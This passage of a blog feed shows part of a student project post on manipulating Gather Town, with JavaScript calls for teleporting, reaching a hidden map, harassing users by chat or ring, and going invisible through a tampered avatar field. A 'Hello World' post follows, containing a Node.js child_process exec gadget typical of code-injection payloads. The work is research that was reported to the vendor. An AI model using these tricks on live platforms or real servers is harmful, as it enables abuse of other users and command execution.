裡面，所以我們想要瞬移到某個地方就只需要滑鼠點兩下就可以過去了。而且還可以瞬移到不能正常走上去的桌子之類的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">addEventListener</span>(<span class="string">'clickInteraction'</span>, <span class="function">(<span class="params">e,t</span>)=&gt;</span>{</span><br><span class="line">    <span class="keyword">if</span>(e.<span class="property">click</span>.<span class="property">type</span> === <span class="number">1</span>){</span><br><span class="line">        gameSpace.<span class="title function_">teleport</span>(e.<span class="property">click</span>.<span class="property">coords</span>.<span class="property">x</span>, e.<span class="property">click</span>.<span class="property">coords</span>.<span class="property">y</span>)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><video controls="" muted="" style="width: 100%;">    <source src="/ais3-2021-最佳專題/teleport.mp4" type="video/mp4">    <source src="/ais3-2021-最佳專題/teleport-1080.mp4" type="video/mp4"></video><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="property">maps</span></span><br></pre></td></tr></table></figure></div><p>我們還找到了一個地圖的 API ，意外的找到了隱藏的地圖，我們透過先前發現的 teleport 來跳轉到隱藏的地圖，發現是 AIS3 CLUB 東區資安體驗營的場地。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-map.webp" alt="hidden-map"></p><h4 id="隱形人"><a href="#隱形人" class="headerlink" title="隱形人"></a>隱形人</h4><p>在設定角色的時候，封包裡面有個設定 avatar 的地方，把他設成不存在的 avatar 編號，就可以變成隱形人。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-avatar-request.webp" alt="hidden-avatar-request"></p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-avatar.webp" alt="hidden-avatar"></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><p>除了上面那些有趣的東西之外，還有很多有用的東西，可以拿來洗別人訊息、ring 別人之類的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">chat</span>(<span class="string">"&lt;message&gt;"</span>, <span class="string">"&lt;userId&gt;"</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">ringUser</span>(<span class="string">"&lt;userId&gt;"</span>)</span><br></pre></td></tr></table></figure></div><p>當然除了正常一般使用的 API ，還有看了一些場地放東西的 API ，我們是自己去開一個 Gather Town 場地去試的，後來回到 AIS3 的場地實驗的時候發現 Gather Town 有擋好。</p><h3 id="發表"><a href="#發表" class="headerlink" title="發表"></a>發表</h3><p>我們的專題最後大受好評，成為現場反應最熱烈的一組。跟大家切身相關也許正是獲取此最佳專題的一大關鍵，讓我的這組從競爭尤其激烈的 AIS3 2021 WEB 組中脫穎而出。<a class="link" href="https://drive.google.com/file/d/13fm13rPVQA5vVezjzKjYg37_Gl6s49Oo/view?usp=sharing">簡報連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/comments.webp" alt="comments"></p><h3 id="後續"><a href="#後續" class="headerlink" title="後續"></a>後續</h3><h4 id="挑戰"><a href="#挑戰" class="headerlink" title="挑戰"></a>挑戰</h4><p>專題發表之後有人向我提出了挑戰，然候不知道為甚麼他就斷線了 XD。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/nyancat-chal.png" alt="nyancat-chal"></p><h4 id="前進-COSCUP-、-SITCON"><a href="#前進-COSCUP-、-SITCON" class="headerlink" title="前進 COSCUP 、 SITCON"></a>前進 COSCUP 、 SITCON</h4><p>因為疫情， COSCUP 跟 SITCON 也轉成線上舉辦，剛好他們都是使用 Gather Town 來作為線上場地，所以我們做出來的工具真的很有用。</p><p>我們有把我們的專題發現回報給 Gather Town ，然後 <code>gameSpace.whisper</code> API 就被拿掉了，所以這個工具的這一部分就不能用了，不過 teleport 的部分還是好的。</p>]]></content>
    
    
    <summary type="html">AIS3 2021 因疫情採線上舉行。使用的線上場地是 Gather Town。而我的組的專題正是研究 Gather，我們最後能夠對整個線上場地達到一定程度的控制，並且成功的拿下了這年的最佳專題。</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="最佳專題" scheme="https://blog.ching367436.me/categories/AIS3/%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.ching367436.me/hello-world/"/>
    <id>https://blog.ching367436.me/hello-world/</id>
    <published>2023-03-20T13:35:19.000Z</published>
    <updated>2023-03-20T13:35:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hello World!</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="15.243ex" height="1.67ex" role="img" focusable="false" viewBox="0 -716 6737.4 738"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(888,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1354,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1652,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1950,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mo" transform="translate(2657.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3657.4,0)"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(4705.4,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5190.4,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5641.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(5939.4,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6459.4,0)"><path data-c="21" d="M78 661Q78 682 96 699T138 716T180 700T199 661Q199 654 179 432T158 206Q156 198 139 198Q121 198 119 206Q118 209 98 431T78 661ZM79 61Q79 89 97 105T141 121Q164 119 181 104T198 61Q198 31 181 16T139 1Q114 1 97 16T79 61Z"></path></g></g></g></svg></mjx-container></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello World!</span></span><br><span class="line">process.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">'child_process'</span>).<span class="title function_">exec</span>(<span class="string">'touch "/tmp/Hello World!"'</span>);</span><br></pre></td></tr></table></figure></div>  <div class="note p-4 mb-4 rounded-small default">    <p>Hello World</p>  </div>]]></content>
    
    
    <summary type="html">Hello World!</summary>
    
    
    
    <category term="hello" scheme="https://blog.ching367436.me/categories/hello/"/>
    
    <category term="world" scheme="https://blog.ching367436.me/categories/hello/world/"/>
    
    
    <category term="hello-world" scheme="https://blog.ching367436.me/tags/hello-world/"/>
    
  </entry>
  
</feed>
